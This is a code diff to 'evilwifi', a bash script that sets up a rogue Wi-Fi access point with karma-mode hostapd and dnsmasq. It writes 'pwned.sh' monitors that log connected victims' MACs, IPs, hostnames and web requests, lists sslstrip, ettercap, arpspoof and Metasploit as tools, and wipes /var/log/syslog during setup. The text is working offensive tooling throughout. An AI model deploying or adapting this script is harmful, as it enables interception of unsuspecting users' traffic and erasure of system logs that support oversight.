@@ -44,10 +44,10 @@ printf "$timestamp\n";
 }
 function setupenv(){
 REVISION=055
-release_date="07/10/2013"
-mydistro="`awk '{print $1}' /etc/issue`"
-myversion="`awk '{print $2}' /etc/issue`"
-myrelease="`awk '{print $3}' /etc/issue`"
+release_date="08/10/2013"
+mydistro="`awk '/DISTRIB_ID/' /etc/lsb-release | cut -d '=' -f2`"
+myversion="`awk '/DISTRIB_RELEASE/' /etc/lsb-release | cut -d '=' -f2`"
+myrelease="`awk '/DISTRIB_CODENAME/' /etc/lsb-release | cut -d '=' -f2`"
 OK=`printf "\e[1;32m OK \e[0m"`
 WARN=`printf "\e[1;33mWARN\e[0m"`
 FAIL=`printf "\e[1;31mFAIL\e[0m"`
@@ -56,6 +56,8 @@ initpath=`pwd`
 hostname=$(hostname)
 resolution=$(xdpyinfo | grep 'dimensions:' | awk -F" " {'print $2'} | awk -F"x" {'print $1'})
 folder=/tmp/.evilwifi
+datestamp=$(date +%F)
+timestamp=$(date +%I-%M-%S-%p)
 sessionfolder=$folder/$datestamp/$timestamp;
 settings=/etc/evilwifi.conf
 lockfile=$folder/evilwifi.lock
@@ -65,17 +67,22 @@ arpaaddr=$(echo $TAPIP|rev)
 # if [ -f $lockfile ]; then echo "$lockfile Detected - Script Halted!"; exit 1; fi
 if [ ! -d $folder ]; then mkdir $folder; fi
 mkdir -p $sessionfolder;
+touch $folder/currentsession.txt
+echo "$sessionfolder" > $folder/currentsession.txt
 mkdir $sessionfolder/logs;
 mkdir $sessionfolder/pids;
 mkdir $sessionfolder/pcaps;
 mkdir $sessionfolder/config;
 LOG=$sessionfolder/logs/evilwifi.log;
+touch $sessionfolder/logs/dnsmasq.log;
+touch $sessionfolder/logs/hostapd.log;
 touch $sessionfolder/logs/evilwifi.log;
 touch $sessionfolder/logs/missing.log;
 touch $sessionfolder/logs/ipcalc.log
 touch $sessionfolder/config/hostapd.deny;
 touch $sessionfolder/config/hostapd.accept;
 touch $lockfile;
+echo > /var/log/syslog
 }
 function STARTTERM(){
 if [ "$COLORTERM" = "xfce4-terminal" ]; then
@@ -228,12 +235,16 @@ fi
 ######################
 function depends(){
 printf "| [ >> ] Dependency Check Started @ "; DATETIME;
-if [ $UID -eq 0 ]; then echo "We are root: `date`" >> $LOG
+if [ $UID -eq 0 ]; then echo "| [$OK] `id`";
 else
 echo "[$CRIT] Please Run This Script As Root or With Sudo!";
 echo "";
 exit 0; fi
 echo "| [$OK] SCRIPT REVISION: $REVISION"
+if [ -f $settings ]; then
+echo "| [$OK] Config File Found!"; 
+echo "| Loading Settings From $settings"
+LOADCONF=0; else LOADCONF=0; fi
 if [ "$mydistro" = "BackTrack" ]; then echo "| [$OK] $mydistro Version $myversion Release $myrelease"; fi
 if [ "$mydistro" = "Kali" ]; then echo "| [$OK] $mydistro Release $myrelease"; fi
 if [ "$mydistro" = "Ubuntu" ]; then echo "| [$OK] $mydistro Version $myversion"; fi
@@ -241,14 +252,18 @@ if [ "$INTERNET" = "FALSE" ]; then echo "| [$FAIL] No Internet Connection :-("; 
 if [ "$INTERNET" = "TRUE" ]; then echo "| [$OK] We Have Internet :-)"; dnscheck; fi
 if [ "$ICMPBLOCK" = "TRUE" ]; then echo "| [$WARN] Outbound ICMP Ping Is Blocked WAN SIDE ($WANIP)"; fi
 if [ "$DNS" = "FALSE" ]; then echo "| [$FAIL] DNS Error Cant Update Check"; fi
-critarray=( aircrack-ng iptables dnsmasq dhcpd3 dhcpd xterm python macchanger wget perl brctl )
+echo "| Removing Conflicting Installed Packages!";
+dpkg -P --force-depends hostapd 2>/dev/null
+echo "| Checking For Missing Packages!";
+critarray=( aircrack-ng iptables dnsmasq xterm python macchanger wget perl brctl )
 for depend in ${critarray[@]}; do
 type -P $depend &>/dev/null || { echo "| [$CRIT] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
 done
-warnarray=( airdrop-ng arpspoof dpkg driftnet dsniff ettercap hostapd mdk3 msfconsole sslstrip urlsnarf svn nmap )
+warnarray=( airdrop-ng arpspoof dpkg driftnet dsniff dhcpd3 dhcpd ettercap hostapd mdk3 msfconsole sslstrip urlsnarf svn nmap )
 for depend in ${warnarray[@]}; do
 type -P $depend &>/dev/null || { echo "| [$WARN] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
 done
+echo "| Missing Package List Saved To $sessionfolder/logs/missing.log";
 }
 function uninstalldeps(){
 echo "[>] REMOVING AIRCRACK-NG!";
@@ -375,7 +390,6 @@ rm -rf $lockfile
 # CONF FILE MAKER #
 ###################
 function settings(){
-if [ -f $settings ]; then echo "| [$OK] Config File Found!"; fi
 echo ""
 echo "+===================================+"
 echo "| Listing Network Devices           |"
@@ -441,9 +455,8 @@ echo "driver=nl80211" > $hostapdconf
 echo "enable_karma=0" >> $hostapdconf
 echo "karma_black_white=1" >> $hostapdconf
 echo "interface=$ATHIFACE" >> $hostapdconf
-echo "logger_syslog=-1" >> $hostapdconf
-echo "logger_syslog_level=2" >> $hostapdconf
-echo "logger_stdout=-1" >> $hostapdconf
+echo "logger_syslog=0" >> $hostapdconf
+echo "logger_syslog_level=0" >> $hostapdconf
 echo "logger_stdout=2" >> $hostapdconf
 echo "dump_file=$sessionfolder/logs/hostapd.dump" >> $hostapdconf
 echo "ctrl_interface=/var/run/hostapd" >> $hostapdconf
@@ -474,9 +487,8 @@ echo "driver=nl80211" > $hostapdconf
 echo "enable_karma=1" >> $hostapdconf
 echo "karma_black_white=1" >> $hostapdconf
 echo "interface=$ATHIFACE" >> $hostapdconf
-echo "logger_syslog=-1" >> $hostapdconf
-echo "logger_syslog_level=2" >> $hostapdconf
-echo "logger_stdout=-1" >> $hostapdconf
+echo "logger_syslog=0" >> $hostapdconf
+echo "logger_syslog_level=0" >> $hostapdconf
 echo "logger_stdout=2" >> $hostapdconf
 echo "dump_file=$sessionfolder/logs/hostapd.dump" >> $hostapdconf
 echo "ctrl_interface=/var/run/hostapd" >> $hostapdconf
@@ -543,6 +555,7 @@ echo "domain=wirelesslan" >> $dnsmasqconf
 echo "server=/wirelesslan/" >> $dnsmasqconf
 echo "dhcp-leasefile=$sessionfolder/dnsmasq.leases" >> $dnsmasqconf
 echo "resolv-file=$sessionfolder/resolv.conf.auto" >> $dnsmasqconf
+echo "log-facility=$sessionfolder/logs/dnsmasq.log" >> $dnsmasqconf
 #echo "tftp-root=/usb/tftpboot" >> $dnsmasqconf
 #echo "dhcp-boot=pxelinux.0" >> $dnsmasqconf
 echo "stop-dns-rebind" >> $dnsmasqconf
@@ -930,14 +943,13 @@ STARTTERM
 # SHELL SCRIPT VERBOSE MODE #
 #############################
 function taillogshostapd(){
-echo > /var/log/syslog
 # for (i=9; i<=NF; i++)
 echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
 #echo "cur_time=$(awk '// {print $4}' < <(date))" >> $folder/probe.sh
 echo "awk '/Probe/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", datestr, \$5, \$8, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $sessionfolder/logs/hostapd.log)" >> $folder/probe.sh
 echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
 echo "awk '/AP-STA-CONNECTED/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: \n\", datestr, \$3)}' < <(tail -f $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
-echo "awk '/DHCPACK/ && /$BRLANIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
+echo "awk '/DHCPACK/ && /$BRLANIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f $sessionfolder/logs/dnsmasq.log)" >> $folder/pwned.sh
 echo "awk '/AP-STA-DISCONNECTED/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: DISCONNECTED  | IP: 000.000.000.000 | ESSID: \n\", datestr, \$3)}' < <(tail -f $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
 echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
 #echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
@@ -961,13 +973,12 @@ STARTTERM
 #"tail -f $sessionfolder/error.log"
 }
 function taillogsairbase(){
-echo > /var/log/syslog
 # for (i=9; i<=NF; i++)
 echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
 echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $sessionfolder/logs/airbaseng.log)" >> $folder/probe.sh
 echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
 echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $sessionfolder/logs/airbaseng.log) &" >> $folder/pwned.sh
-echo "awk '/DHCPACK/ && /$BRLANIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
+echo "awk '/DHCPACK/ && /$BRLANIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f $sessionfolder/logs/dnsmasq.log)" >> $folder/pwned.sh
 echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
 #echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
 echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/logs/access.log)" >> $folder/web.sh
@@ -1503,9 +1514,9 @@ stopshit
 # responder
 echo ""
 poisonmenu
-if [ -f != $settings ]; then softapmenu; fi
-if [ "$mode" != "2" ]; then dhcpmenu; fi
-if [ -f != $settings ]; then settings; fi
+if [ "$LOADCONF" = "0" ]; then softapmenu; fi
+if [ "$LOADCONF" = "0" ]; then dhcpmenu; fi
+if [ "$LOADCONF" = "0" ]; then settings; fi
 # debugsettings
 if [ "$softap" = "1" ] && [ "$ATHIFACE" != "" ]; then TAPIFACE=$ATHIFACE; fi
 if [ "$softap" = "2" ] && [ "$ATHIFACE" != "" ]; then TAPIFACE=$ATHIFACE; fi
